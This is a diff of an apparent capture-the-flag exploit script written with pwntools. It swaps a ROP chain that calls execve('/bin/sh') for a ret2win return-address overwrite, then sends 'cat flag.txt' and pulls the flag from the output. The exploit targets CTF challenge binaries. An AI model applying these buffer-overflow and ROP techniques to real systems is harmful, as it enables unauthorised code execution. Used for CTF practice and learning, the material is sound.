@@ -4,8 +4,6 @@ import re
 
 context.log_level = 'ERROR'
 logging.disable(logging.CRITICAL)
-context.clear(arch='amd64')
-
 
 # ------------------------------------- #
 # exploit(binary: str)                  #
@@ -19,24 +17,25 @@ def exploit(binary: str):
     url = f'ace-service-{binary}.chals.io'
     p = remote(url, 443, ssl=True, sni=url)
     e = ELF(binary)
-    rop = ROP(binary)
-    p.recvuntil(b'>>>')
+
+    #p.recvuntil(b'>>>')
 
     payload = b''
 
     payload += cyclic(detection.find_rip_offset(binary))
-    rop(rdi=next(e.search(b'/bin/sh\x00')), rsi=0, rdx=0)
-    rop.call('execve')
-    payload += rop.chain()
+    payload += p64(e.sym['win'] + 4)
 
     p.sendline(payload)
-    # Since I'm going for a shell rather than a win function, there's no try and see here.
-    p.sendline(b'cat flag.txt')
+
+    try: # Do we have a shell?
+        p.sendline(b'cat flag.txt')
+    except: # Probably just printed the flag
+        pass
+
     output = p.recvall(timeout=0.2)
 
     flag = re.findall(flag_regex, output.decode())
-    if flag:  # Success
-        # print(flag)
+    if flag: # Success
         return flag[0]
-    else:  # Failure
-        return
+    else: # Failure
+        return None
